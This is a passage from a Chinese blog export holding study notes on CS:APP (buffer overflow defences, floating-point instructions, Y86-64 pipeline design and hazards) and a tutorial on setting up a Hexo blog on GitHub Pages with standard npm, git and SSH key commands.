<p><img src="/images/《深入理解计算机系统》学习笔记/gdb_cmd.png" alt="gdb_cmd" style="zoom:50%;" /></p>
<h4 id="内存越界引用和缓冲区溢出">内存越界引用和缓冲区溢出</h4>
<p>通常在栈中分配一个字符数组保存一个字符串时，如果用 gets() 函数读入，如果字符串的长度超出了为数组分配的空间，就会导致内存越界访问，更严重时如果读入的字符串覆盖了返回地址，就会导致缓冲区溢出。函数无法找到该返回的位置。</p>
<p>更致命的是可以给程序输入一个字符串，这个字符串保护一些可执行代码的字节编码，称为攻击代码，还有一些字节会覆盖原本的返回地址，从而使程序在返回时跳转到攻击代码。</p>
<p>一些对抗缓冲区溢出攻击的方法：</p>
<ol type="1">
<li><p>栈随机化</p>
<p>在远古的机器上，栈的位置是相当固定的。因此，如果一个攻击者确定了一个常见的 Web服务器所使用的栈空间，那就可以对很多的机器都发起攻击，即许多系统都容易受到同一种病毒的攻击，这种现象称为安全单一化 (security monoculture) .</p>
<p>栈随机化的思想即是让程序每次运行时，栈的位置都有所变化，使得不是很多机器都容易受到单一的攻击。但是攻击者总是可以用暴力破解这种随机化。</p></li>
<li><p>栈破坏检测</p>
<p>GCC在产生的代码中加入栈保护机制，其思想是在返回地址与局部缓冲区中插入一段特殊的 canary 值。（这个名字的来源是矿工在下矿井的时候往往会带一只金丝雀，因为其对有毒气体比较敏感，帮助侦测是不是有有毒气体）之后在程序需要返回时，判断 canary 的值是否发生了变化，如果发生了变化，证明发生了缓冲区溢出，则让程序异常中止。</p></li>
<li><p>限制可执行代码区域</p>
<p>这种思想是限制栈中的哪些内存区域是可执行的，哪些是不可执行的，这样即是被注入了攻击代码，这段代码只要不在可执行的内存区域内，自然也无法被执行。</p></li>
</ol>
<h4 id="支持变长栈帧">支持变长栈帧</h4>
<p>为了管理变长栈帧，x86-64 代码使用寄存器%rbp作为帧指针 (frame pointer) ，有时也称为基指针 (base pointer)。用于记录一个栈帧的起始地址，在程序需要返回时，只需要将%rsp设置为%rbp，并弹出%rbp即可。</p>
<h4 id="浮点代码">浮点代码</h4>
<h5 id="一组浮点数寄存器ymm-256位">一组浮点数寄存器YMM (256位)</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/media_register.png" alt="media_register" style="zoom:50%;" /></p>
<h5 id="浮点数移动指令">浮点数移动指令</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/float_move.png" alt="float_move" style="zoom:50%;" /></p>
<h5 id="浮点数类型转换指令">浮点数类型转换指令</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/float_int_conversion.png" alt="float_int_conversion" style="zoom:50%;" /></p>
<h5 id="浮点数算术运算指令">浮点数算术运算指令</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/float_arith_op.png" alt="float_arith_op" style="zoom:50%;" /></p>
<h5 id="浮点数位运算指令">浮点数位运算指令</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/float_bit_op.png" alt="float_bit_op" style="zoom:50%;" /></p>
<h5 id="浮点数比较指令">浮点数比较指令</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/float_cmp.png" alt="float_cmp" style="zoom:50%;" /></p>
<h3 id="第四章-处理器体系结构">第四章 处理器体系结构</h3>
<p>在本章中，利用 x86-64 的体系结构，搭建一个简化版的 Y86-64 的处理器体系结构。</p>
<h4 id="y86-64-指令集体系结构">Y86-64 指令集体系结构</h4>
<h5 id="程序员可见状态">程序员可见状态</h5>
<p>RF：程序寄存器。共15个：%rax, %rcx, %rdx, %rbx, %rsp, %rbp, %rsi, %rdi及%r8到%r14，相比x86-64省略了%r15以简化指令的编码</p>
<p>CC：条件码。共三个：ZF, SF, OF</p>
<p>PC：程序计数器</p>
<p>Stat：程序状态</p>
<h5 id="y86-64-指令">Y86-64 指令</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/instr_set.png" alt="instr_set" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/fun_code.png" alt="fun_code" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/register_id.png" alt="register_id" style="zoom:50%;" /></p>
<h5 id="y86-64-异常">Y86-64 异常</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/stat_code.png" alt="stat_code" style="zoom:50%;" /></p>
<h5 id="一些特殊的-y86-64-指令">一些特殊的 Y86-64 指令</h5>
<p><code>pushq %rsp</code>，是压入%rsp的原始值呢，还是压入%rsp-8的值呢？类似的还有<code>popq %rsp</code>。</p>
<p>经过实验可发现，对于<code>pushq %rsp</code>是先压入%rsp的值，再将%rsp减8。对于<code>popq %rsp</code>是先将%rsp的值加8，再将栈顶的值弹出赋给%rsp。对应C语言可理解为，<code>st[top--] = top</code>和<code>top = st[++top]</code>。但是我们正常情况下肯定不会写出这样的语句的，正常的程序编译得到的汇编指令也不会有这种怪异的东西，但是为了保证程序的一致性，在Intel的文档中还是做了相关规定。</p>
<h4 id="逻辑设计和硬件控制语言-hcl">逻辑设计和硬件控制语言 HCL</h4>
<h5 id="逻辑门">逻辑门</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/logic_gate.png" alt="logic_gate" style="zoom:50%;" /></p>
<p>一个简单但是很有用的组合电路，多路复用器（multiplexor，通常称为"MUX"）。</p>
<p><code>bool out = (s &amp;&amp; a) || (!s &amp;&amp; b);</code></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/MUX.png" alt="MUX" style="zoom:50%;" /></p>
<p>在HCL中，多路复用函数用情况表达式 (case expression) 来描述，通用格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	select1 : expr1;</span><br><span class="line">	select2 : expr2;</span><br><span class="line">	.</span><br><span class="line">	.</span><br><span class="line">	.</span><br><span class="line">	selectk : exprk;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>例如上述的多路复用表达式就可写为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	s : a;</span><br><span class="line">	1 : b;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>情况表达式是按顺序求值的，第一个为真的表达式会被选中。</p>
<p>例如想要使用逻辑电路找出一组字A, B, C中的最小值，就可以用HCL表示如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">word Min3 = [</span><br><span class="line">	A &lt;= B &amp;&amp; A &lt;= C : A;</span><br><span class="line">	B &lt;= C			 : B;</span><br><span class="line">	1				 : C;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<h5 id="存储器和时钟">存储器和时钟</h5>
<p>组合电路从本质上说，只是一个根据输入信号，按电路设计的规则，产生某种输出的函数，并不存储任何信息。为了产生时序电路，我们必须引入按位存储信息的设备。存储设备都是由同一个时钟控制的，时钟是一个周期性信号，决定什么时候把新值加载到设备中，我们有两类存储器设备，时钟寄存器（寄存器）和随机访问存储器（内存）。</p>
<h4 id="y86-64-的顺序实现">Y86-64 的顺序实现</h4>
<p>我们先按住朴素的想法，描述一个称为 SEQ (sequential) 的处理器。在每个时钟周期上，SEQ 执行处理一条完整指令所需的所有步骤，即按照顺序一条条指令的执行。但是这会导致效率十分低下，我们会在此基础上再不断优化，最终实现一个高效的、流水线化的处理器。</p>
<h5 id="将处理组织成阶段">将处理组织成阶段</h5>
<p>我们将所有的指令分为以下几个阶段：</p>
<p>取值（fetch）：从程序计数器 (PC) 所指地址中取出一个字节共两个4位，分别代表icode（指令代码）和ifun（指令功能）。根据icode还可能取出一个字节代表寄存器，指明一个或两个寄存器rA和rB，还可能取出一个4字节常数valC。并按照顺序计算出下一条指令的地址valP，即valP等于PC的值加上已取出指令的长度。</p>
<p>译码（decode）：从寄存器文件中读入最多两个操作数，即rA和rB对应的值valA和valB。</p>
<p>执行（execute）：算术/逻辑单元（ALU）执行指令指明的操作，也可能会设置条件码。对一个传送指令来说，这个阶段会检验条件码和传送条件，从而判断是否更新目标寄存器。对于一个跳转指令来说，这个阶段会决定是不是应该选择分支。</p>
<p>存储（memory）：将数据写入内存，或从内存读出数据，读出的值为valM。</p>
<p>写回（write back）：最多可以写两个结果到寄存器中</p>
<p>更新PC（PC update）：将PC设置为下一条指令的地址。</p>
<p>下面是一些指令对应的各阶段操作。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/OPq.png" alt="OPq" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/rm_mr.png" alt="rm_mr" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/push_pop.png" alt="push_pop" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/jXX.png" alt="jXX" style="zoom:50%;" /></p>
<h5 id="seq硬件结构">SEQ硬件结构</h5>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/seq_iple.png" alt="seq_iple" style="zoom:50%;" /></p>
<h5 id="seq各阶段的实现">SEQ各阶段的实现</h5>
<p>fetch阶段</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/fetch_stage.png" alt="fetch_stage" style="zoom:50%;" /></p>
<p>根据icode的值，可以确定三个1位的信号：instr_valid，用于判断指令合不合法；need_regids，用于判断指令是否包含寄存器指示符字节；need_valC，用于判断指令是否包含常数。</p>
<p>decode和write-back阶段</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/decode_wb_stage.png" alt="decode_wb_stage" style="zoom:50%;" /></p>
<p>execute阶段</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/execute_stage.png" alt="execute_stage" style="zoom:50%;" /></p>
<p>memory阶段</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/memory_stage.png" alt="memory_stage" style="zoom:50%;" /></p>
<p>PC update阶段</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/PC_stage.png" alt="PC_stage" style="zoom:50%;" /></p>
<h4 id="流水线的通用原理">流水线的通用原理</h4>
<p>流水线的一个重要特性是提高了系统的吞吐量 (throughput)，也就是单位时间内服务的顾客总数，不过也会轻微地增加一点延迟 (latency)，也就是服务一个顾客所需要的时间。</p>
<h5 id="流水线的计算">流水线的计算</h5>
<p>在现代逻辑设计中，电路延迟以皮秒 (picosecond, ps)为单位，也就是<span class="math inline">\(10^{-12}\)</span>秒。</p>
<p>我们用每秒千兆条指令 (GIPS) 为单位来描述吞吐量。执行一条指令所需要的时间称为延迟 (latency)。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/unpipelined.png" alt="unpipelined" style="zoom:50%;" /></p>
<p>上图是未使用流水线的情况，一条指令的延迟是320ps，因此吞吐量<span class="math inline">\(\frac{1s}{320ps} = 3.125GIPS\)</span></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/three_stage_pipelined.png" alt="three_stage_pipelined" style="zoom:50%;" /></p>
<p>上图是使用流水线的情况，添加了两个中间寄存器，将整个过程分为了3部分，虽然单个指令的延迟变为了360ps，但是可以同时执行多条指令，从而提高了吞吐量，我们可以将时钟周期设为120ps，此时的吞吐量为<span class="math inline">\(\frac{1s}{120ps} = 8.33GIPS\)</span></p>
<h5 id="流水线的局限性">流水线的局限性</h5>
<ol type="1">
<li>不一致的划分</li>
</ol>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/ppl_limit_nonstage.png" alt="ppl_limit_nonstage" style="zoom:50%;" /></p>
<p>由于时钟周期受最长的那部分时间限制，因此对于上图的流水线，时钟周期必须为170ps，导致只有B始终处于工作状态，从而限制了流水线的效率。</p>
<ol start="2" type="1">
<li><p>流水线过深，收益率下降</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/ppl_limit_overhead.png" alt="ppl_limit_overhead" style="zoom:50%;" /></p></li>
</ol>
<p>我们将上一节的划分3部分的流水线扩大一倍，划分为6个部分，但是此时受寄存器的延迟影响，时钟周期只能设置为70ps，从而吞吐量为<span class="math inline">\(\frac{1s}{70ps} = 14.29GIPS\)</span>，吞吐量的性能只提升了<span class="math inline">\(\frac{14.29}{8.33} = 1.71\)</span>，类似于边界效应，后续的提升只会越来越小。综合成本和效率等因素，现代处理器的流水线一般为 (15或更多阶段)。</p>
<h5 id="带反馈的流水线系统">带反馈的流水线系统</h5>
<p>一些指令在执行时可能是相关的，比如</p>
<p><img src="../images/《深入理解计算机系统》学习笔记/chap4/ppl_fb.png" alt="ppl_fb" style="zoom:50%;" /></p>
<p>如果在流水线上，%rax还没被赋值为50，而addq指令已经取出了%rax的值valA，就会导致错误。类似的在循环或跳转语句时，也会出现类似的问题，因此我们需要考虑合适的方式来避免流水线出错。具体的实现方式将会在下面讨论。</p>
<h4 id="y86-64-的流水线实现">Y86-64 的流水线实现</h4>
<h5 id="seq重新安排计算阶段">SEQ+：重新安排计算阶段</h5>
<p>相比于SEQ，我们移动PC阶段，使得它的逻辑在时钟周期开始时活动，使它计算当前指令的PC值。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/SEQ+.png" alt="SEQ+" style="zoom:50%;" /></p>
<p>在SEQ+中，我们发现没有专门的一个寄存器来存储PC的值，而是通过上一阶段保存的一些值，动态的计算出PC的值。我们的思想是，只要处理器能够正确执行任意的机器语言程序，我们不需要将状态编码成程序员可见的状态指定形式，只需要能够产生正确的值即可。这一思想之后还会多次用到。</p>
<p>SEQ到SEQ+中对状态单元的改变是一种很通用的改进例子，称为电路重定时 (circuit retiming)。重定时改变了一个系统的状态表示，但是并不改变它的逻辑行为。通常用它来平衡一个流水线系统中各个阶段的之间的延迟。</p>
<h5 id="插入流水线寄存器">插入流水线寄存器</h5>
<p>我们在SEQ+的各个阶段之间插入流水线寄存器，并对信号重新排序，得到<code>PIPE-</code>处理器，之所以是<code>PIPE-</code>是因为它和我们最终的处理器设计相比，还有一些差距。</p>
<p>流水线寄存器的标号：</p>
<p>F：保存程序计数器的预测值</p>
<p>D：位于取值和译码阶段之间。它保存关于最新取出的指令的信息，将由译码阶段进行处理</p>
<p>E：位于译码和执行阶段之间。它保存关于译码的指令和从寄存器文件读出的值的信息，将由执行阶段进行处理。</p>
<p>M：位于执行和存储阶段之间。它保存最新执行的指令的结果，将由存储阶段进行处理。它还保存关于用于处理条件转移的分支条件和分支目标的信息。</p>
<p>W：位于存储阶段和反馈路径之间。反馈路径将计算出来的值提供给寄存器文件写，而当完成ret指令时，它还要向PC选择逻辑提供返回地址。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/PIPE-.png" alt="PIPE-" style="zoom:50%;" /></p>
<h5 id="对信号进行重新排列和标号">对信号进行重新排列和标号</h5>
<p>在顺序实现的SEQ和SEQ+中，任意时刻只处理一条指令，因此valC、srcA等信号值有唯一值，但在流水线的设计中，各个指令相关联的值在不同阶段有多个版本，比如上图中，“Stat”就有4个，我们通常给名字加上前缀代表不同的阶段。如4个“Stat”可被命名为"D_stat", "E_stat", "M_stat", "W_stat"，代表不同流水线寄存器的状态码，我们用小写字母"f", "d", "e", "m", "w"来表示不同流水线阶段产生的状态信号，比如"m_stat"表示的是存储阶段由控制逻辑块产生出的状态信号。</p>
<h5 id="预测下一个pc">预测下一个PC</h5>
<p>为了达到流水线的效率，我们必须保证在一条指令开始执行后，下一条指令已经进入到流水线中。但是遇到条件分支指令，我们就必须等待几个周期，待上一条指令执行完成后，我们才能确定下一条指令是什么。对于这个问题，我们采取分支预测的技术手段，根据预测的结果进行取指，执行预测的语句。但是我们有可能出现预测错误的情况，这时候我们需要采取某种方式来处理预测错误造成的后果，我们会在后面讨论这个问题的解决方案。</p>
<p>在我们的设计中使用总是选择分支的预测策略。研究表明这种策略的成功率约为60%。还有一种复杂一点的策略是 backward taken, forward not-taken (BTFNT)，当分支地址在下一条地址之前就选择分支，在下一条地址之后就不选择分支，这种策略的成功率约为65%。</p>
<h5 id="流水线风险">流水线风险</h5>
<p>在流水线上会因为前一条指令尚未完成，而后一条指令已经部分执行，从而导致一些风险。我们可以分为两类：数据相关的风险和控制相关的风险。</p>
<p>下图给出了数据相关的风险的例子</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.43.png" alt="4.43" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.44.png" alt="4.44" style="zoom:50%;" /></p>
<p>当插入的nop指令不足时，第二行的指令尚未完成write-back阶段，%rax的值尚未赋值为3，而此时addq指令已经取出了%rax的值，这就会导致错误。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.45.png" alt="4.45" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.46.png" alt="4.46" style="zoom:50%;" /></p>
<p>更进一步的情况下，两个寄存器内的值都是错误值。</p>
<p>我们下面对可能出现的风险做一些细致分析：</p>
<p>对于我们的Y86-64来说，程序状态包括程序寄存器、程序计数器、内存、条件码寄存器和状态寄存器。</p>
<p><strong>程序寄存器</strong>：上文已经详细描述了程序寄存器上可能出现的风险。出现这种风险是因为可能出现上一条指令的写阶段尚未完成，下一条指令已经读取了。</p>
<p><strong>程序计数器</strong>：我们在做分支预测时可能出现预测错误的风险。</p>
<p><strong>内存</strong>：读和写数据都发生在存储阶段，因此在一条指令读内存时，前一条指令必然已经完成了写内存，不会出现风险。但是这里会出现一种奇怪的风险，当程序会自我修改时，即写内存时修改了下一条指令，而下一条指令已经完成了取指，我们可以规定程序不能修改自身，从而不需要特别的保护措施。</p>
<p><strong>条件码寄存器</strong>：OPq指令会在执行阶段修改条件码寄存器，而条件传送指令和条件转移指令也是在执行阶段访问这些寄存器，因此访问时，前一条语句的执行阶段已经完成，在需要的情况下已经修改了条件码寄存器，因此不会出现风险。</p>
<p><strong>状态寄存器</strong>：在流水线中我们的每阶段都和一个Stat相关联，因此出现异常时，可以保证处理器能够有条理的停止。</p>
<h6 id="规避数据相关的风险">规避数据相关的风险</h6>
<ol type="1">
<li><p>用暂停来规避风险</p>
<p>当处理器发现风险时，会暂停其中的一条或多条指令，等待风险消失后，再继续执行。而暂停的方法是通过插入bubble，从而是一些指令停留在原本的阶段中。</p></li>
</ol>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/bubble.png" alt="bubble" style="zoom:50%;" /></p>
<p>虽然这种朴素的方法确实能够避免风险，但是在最坏的情况下，我们的流水线变得和不使用流水线技术没什么区别，极大地降低了效率。</p>
<ol start="2" type="1">
<li><p>用数据转发来规避风险</p>
<p>我们在发现风险时，与其暂停等待寄存器的write-back阶段完成，不如直接将要写的值作为源，传递给指定的寄存器。比如我们要引用寄存器%rax作为操作数valB的源，但是在写的阶段还有一个valE未写入%rax，我们就可以直接将信号W_valE作为操作数valB的源。这种直接将结果从流水线的一个阶段传到较早阶段的方法称为数据转发 (data forwarding)。</p></li>
</ol>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/forwarding.png" alt="forwarding" style="zoom:50%;" /></p>
<p>但是有一类风险不能单纯使用数据转发来避免，因为读取内存在流水线发生的比较晚，当下一条指令执行decode阶段时，上一条指令还处于execute阶段，而内存的读取要在memory阶段，我们不可能把下一个时钟周期的结果提前发送回来，因此这种时候我们就必须结合两种做法，先插入一个bubble暂停一下，在进行数据转发，如下图所示。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.54.png" alt="4.54" style="zoom:50%;" /></p>
<p>我们现在可以在我们的流水线设计中加入旁路来实现数据的转发，最终形成如下图所示的流水线结构。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/final_PIPE.png" alt="final_PIPE" style="zoom:50%;" /></p>
<h6 id="规避控制相关的风险">规避控制相关的风险</h6>
<p>我们知道控制相关的风险只有在ret指令和跳转指令上可能发生，其中跳转指令只有在预测错误的时候才会出现问题。</p>
<p>面对ret指令，我们选择插入bubble，等待ret指令完成后，在继续执行下一个正确的指令。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/ret_hazard.png" alt="ret_hazard" style="zoom:50%;" /></p>
<p>当发生预测错误时，我们的跳转指令会在两个时钟周期后达到执行阶段，判断出是否应该跳转，此时之后的语句只执行了fetch和decode阶段，并不会影响程序的可见状态。此时程序如果发现预测错误，就会及时制止这两条语句，因此唯一的问题只是浪费了两个时钟周期的处理能力。</p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/jXX_hazard.png" alt="jXX_hazard" style="zoom:50%;" /></p>
<h4 id="异常处理">异常处理</h4>
<p>指令集体系结构的三种内部异常：（1）halt指令，（2）非法指令，（3）访问非法地址</p>
<p>在异常处理时有一些细节问题：</p>
<ol type="1">
<li><p>一个时间周期内有多条指令引起异常，报告优先级最高的显然应该是流水线中最深的那一条指令</p></li>
<li><p>当分支预测错误才出现异常，之后回到正确的分支后，要取消异常指令，避免出现异常</p></li>
<li><p>一种情况是，一个指令本应该会产生异常，但后一条指令在异常的阶段发生之前，修改了部分状态或寄存器，从而使前一条指令不会出现异常。本该出现的异常被忽视</p></li>
</ol>
<p>书中只是简单的提供了一点对处理异常的说明，并没有做详细描述。处理异常的简单思想是，在每个状态都设置了Stat状态码，它随着流水线一起行动，当到达write-back的阶段时，就报告异常，如果已经有Stat出现了异常，就会禁止流水线后面的指令更新状态码和寄存器等，直到异常到达最后阶段。</p>
<h4 id="pipe-各阶段的实现">PIPE 各阶段的实现</h4>
<p>在这一节给出了各个阶段的细节描述，以及给出了HCL语言描述的信号控制状态。</p>
<p>对整个PIPE的完整HCL语言描述可以参见：<a href="http://csapp.cs.cmu.edu/3e/waside/waside-hcl.pdf">http://csapp.cs.cmu.edu/3e/waside/waside-hcl.pdf</a></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.57.png" alt="4.57" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.58.png" alt="4.58" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.60.png" alt="4.60" style="zoom:50%;" /></p>
<p><img src="/images/《深入理解计算机系统》学习笔记/chap4/4.61.png" alt="4.61" style="zoom:50%;" /></p>
<h5 id="流水线控制逻辑">流水线控制逻辑</h5>
<p>主要要处理一些特殊情况：</p>
<p>1.从内存读数据的风险 2.ret指令的处理 3.分支预测发生错误时的处理 4.发生异常的处理</p>
<p>之后介绍处理这些问题的方式：</p>
<p>本人摸了，不想写这块了，挖个坑下次再来吧。。。这一章就没怎么搞明白，细节太多了QAQ</p>
<h5 id="性能分析">性能分析</h5>
<p>我们可以用每条指令平均需要的周期数 (CPI, Cycles Per Instruction) 来衡量处理器的整体效率。假设我们需要执行<span class="math inline">\(C_i\)</span>条指令，<span class="math inline">\(C_b\)</span>个插入的bubble，则我们可以计算<span class="math inline">\(CPI = \frac{C_i + C_b}{C_i}= 1+ \frac{C_b}{C_i}\)</span></p>
<h5 id="一些未完成的工作">一些未完成的工作</h5>
<ol type="1">
<li><p>多周期指令</p>
<p>我们的指令集中只有一些很简单的操作，但是在更完整的指令集中，我们还需要如整数、浮点数乘除法等指令。我们不仅需要额外的硬件来实现这些操作，同时还因为这些指令所需周期更长，需要考虑如何协调这些指令和流水线的其他部分。</p></li>
<li><p>与储存系统的接口</p>
<p>我们曾提到过，有一种自我修改代码，一条指令对一个存储区域进行了修改，之后又从这个区域中读取指令，我们没有考虑如何处理这个问题。</p></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Hexo+Github搭建个人博客</title>
    <url>/2021/10/31/%E5%9F%BA%E4%BA%8EHexo+Github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>本文在mac OS11.6环境下进行配置，出现的一些问题在文末进行总结。</p>
<h5 id="安装node.js">安装Node.js</h5>
<p>可通过在terminal中运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install node.js</span><br></pre></td></tr></table></figure>
<p>安装Node.js，可通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
<p>查看node版本，确认是否成功安装。</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.01.46.png" alt="node版本" /><figcaption aria-hidden="true">node版本</figcaption>
</figure>
<span id="more"></span>
<h5 id="安装git">安装git</h5>
<p>通过安装Xcode Command Line Tools即带有git，可通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>
<p>查看git的版本，确认是否成功安装。</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.02.07.png" alt="git版本" /><figcaption aria-hidden="true">git版本</figcaption>
</figure>
<h5 id="注册获取github仓库">注册获取GitHub仓库</h5>
<p>注册一个github账号，在Your repositories里新建一个仓库，其中repository name填username.github.io</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.08.01.png" alt="创建GitHub仓库" /><figcaption aria-hidden="true">创建GitHub仓库</figcaption>
</figure>
<h5 id="安装hexo">安装Hexo</h5>
<p>在你要存储你的博客文件的地方开始安装Hexo，可通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i hexo-cli -g</span><br></pre></td></tr></table></figure>
<p>安装Hexo。</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.10.47.png" alt="安装Hexo" /><figcaption aria-hidden="true">安装Hexo</figcaption>
</figure>
<p>之后通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>
<p>确认Hexo版本从而确认是否成功安装。</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.12.37.png" alt="Hexo版本" /><figcaption aria-hidden="true">Hexo版本</figcaption>
</figure>
<h5 id="创建博客文件">创建博客文件</h5>
<p>可通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init Blog</span><br></pre></td></tr></table></figure>
<p>在当前位置初始化一个名字为Blog的文件夹。</p>
<p>通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd Blog</span><br></pre></td></tr></table></figure>
<p>进入Blog文件夹，接着输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>安装必需的组件。</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.16.05.png" alt="安装必需组件" /><figcaption aria-hidden="true">安装必需组件</figcaption>
</figure>
<h5 id="利用hexo初始文件生成本地网页">利用Hexo初始文件生成本地网页</h5>
<p>通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>生成本地网页并部署至本地服务器。<img src="/images/截屏2021-10-31%20下午9.17.38.png" alt="部署本地网页" /></p>
<p>这时通过http://localhost:4000即可进入我们的博客预览。</p>
<figure>
<img src="/images/截屏2021-10-31%20下午9.19.42.png" alt="博客预览" /><figcaption aria-hidden="true">博客预览</figcaption>
</figure>
<p>上图所示即为Hexo提供的初始模版。</p>
<h5 id="将本地网页部署到github上">将本地网页部署到GitHub上</h5>
<p>进入博客文件夹位置（上文的Blog）运行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure>
<p>之后通过下列命令生成密钥SSH key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure>
<p>选择文件夹与输入密码和确认密码时都可不填，回车三次即可。</p>
<p>之后通过下列命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>可返回密钥，将该段内容复制。</p>
<p>进入GitHub，头像下方的settings，点击SSH and GPG keys，新建一个SSH，Title可随意，Key中填入上面复制的内容。</p>
<p>回到Terminal输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<p>出现下图所示内容则代表GitHub成功与Blog文件夹连接。</p>
<p><img src="/images/截屏2021-10-31%20下午9.32.30.png" /></p>
<p>之后通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim _config.yml</span><br></pre></td></tr></table></figure>
<p>进入_config.yml进行修改，将最后一行deploy补充为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname/yourname.github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<figure>
<img src="/images/截屏2021-10-31%20下午9.35.28.png" alt="修改_config.yml" /><figcaption aria-hidden="true">修改_config.yml</figcaption>
</figure>
<p>之后保存退出即可。</p>
<p>最后安装一个拓展，通过下列命令实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i hexo-deployer-git</span><br></pre></td></tr></table></figure>
<p>最后通过下列命令即可将博客部署到Github网页上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>稍等一会即可通过yourname.github.io访问你的博客啦！</p>
<p>如果部署失败可通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>再次尝试。</p>
<h5 id="模版修改">模版修改</h5>
